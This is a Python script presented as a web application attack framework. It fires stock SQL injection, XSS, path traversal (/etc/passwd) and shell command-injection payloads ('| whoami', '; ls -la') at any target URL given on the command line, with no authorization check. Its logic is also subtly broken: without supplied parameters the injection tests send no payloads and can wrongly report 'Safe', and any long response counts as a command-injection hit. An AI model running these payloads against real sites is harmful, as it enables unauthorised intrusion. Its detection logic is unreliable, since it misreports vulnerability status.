#!/usr/bin/env python3
"""
WEB EXPLOITS - Web Application Attack Framework
Authority Level: 9.9
"""

import requests
from urllib.parse import urljoin, urlparse
from typing import Dict, List
import logging

logger = logging.getLogger(__name__)

class WebExploits:
    """Web application exploitation"""
    
    def __init__(self):
        self.session = requests.Session()
        self.payloads = {
            'sqli': ["' OR '1'='1", "1' OR '1'='1' --", "' UNION SELECT NULL--"],
            'xss': ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"],
            'lfi': ["../../../etc/passwd", "..\\..\\..\\windows\\system.ini"],
            'rce': ["; ls -la", "| whoami", "&& dir"]
        }
    
    def sql_injection_test(self, url: str, params: Dict = None) -> Dict:
        """Test for SQL injection vulnerabilities"""
        results = []
        
        for payload in self.payloads['sqli']:
            try:
                test_params = params.copy() if params else {}
                for key in test_params.keys():
                    test_params[key] = payload
                
                response = self.session.get(url, params=test_params, timeout=10)
                
                # Check for common SQLi indicators
                if any(indicator in response.text.lower() for indicator in 
                       ['sql', 'mysql', 'syntax error', 'database']):
                    results.append({
                        'payload': payload,
                        'vulnerable': True,
                        'response_code': response.status_code
                    })
            except Exception as e:
                logger.error(f"SQLi test error: {e}")
        
        return {
            'status': 'complete',
            'url': url,
            'findings': results,
            'vulnerable': len(results) > 0
        }
    
    def xss_test(self, url: str, params: Dict = None) -> Dict:
        """Test for XSS vulnerabilities"""
        results = []
        
        for payload in self.payloads['xss']:
            try:
                test_params = params.copy() if params else {}
                for key in test_params.keys():
                    test_params[key] = payload
                
                response = self.session.get(url, params=test_params, timeout=10)
                
                if payload in response.text:
                    results.append({
                        'payload': payload,
                        'reflected': True,
                        'response_code': response.status_code
                    })
            except Exception as e:
                logger.error(f"XSS test error: {e}")
        
        return {
            'status': 'complete',
            'url': url,
            'findings': results,
            'vulnerable': len(results) > 0
        }
    
    def directory_traversal_test(self, url: str) -> Dict:
        """Test for directory traversal/LFI"""
        results = []
        
        for payload in self.payloads['lfi']:
            try:
                test_url = urljoin(url, payload)
                response = self.session.get(test_url, timeout=10)
                
                # Check for indicators
                if any(indicator in response.text for indicator in 
                       ['root:', '[extensions]', 'bin/bash']):
                    results.append({
                        'payload': payload,
                        'vulnerable': True
                    })
            except Exception as e:
                logger.error(f"LFI test error: {e}")
        
        return {
            'status': 'complete',
            'findings': results,
            'vulnerable': len(results) > 0
        }
    
    def command_injection_test(self, url: str, params: Dict = None) -> Dict:
        """Test for command injection"""
        results = []
        
        for payload in self.payloads['rce']:
            try:
                test_params = params.copy() if params else {}
                for key in test_params.keys():
                    test_params[key] = payload
                
                response = self.session.get(url, params=test_params, timeout=10)
                
                # Basic check - real implementation needs more sophistication
                if len(response.text) > 1000:  # Possible command output
                    results.append({
                        'payload': payload,
                        'potential': True
                    })
            except Exception as e:
                logger.error(f"RCE test error: {e}")
        
        return {
            'status': 'complete',
            'findings': results
        }

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Web Exploitation Framework")
    parser.add_argument('--url', required=True, help='Target URL')
    parser.add_argument('--sqli', action='store_true', help='SQL injection test')
    parser.add_argument('--xss', action='store_true', help='XSS test')
    parser.add_argument('--lfi', action='store_true', help='Directory traversal test')
    parser.add_argument('--rce', action='store_true', help='Command injection test')
    parser.add_argument('--all', action='store_true', help='Run all tests')
    
    args = parser.parse_args()
    
    web = WebExploits()
    
    if args.all or args.sqli:
        result = web.sql_injection_test(args.url)
        print(f"\nSQL Injection: {'VULNERABLE' if result['vulnerable'] else 'Safe'}")
        for finding in result['findings']:
            print(f"  Payload: {finding['payload']}")
    
    if args.all or args.xss:
        result = web.xss_test(args.url)
        print(f"\nXSS: {'VULNERABLE' if result['vulnerable'] else 'Safe'}")
    
    if args.all or args.lfi:
        result = web.directory_traversal_test(args.url)
        print(f"\nLFI: {'VULNERABLE' if result['vulnerable'] else 'Safe'}")
    
    if args.all or args.rce:
        result = web.command_injection_test(args.url)
        print(f"\nRCE Test: {result['status']}")
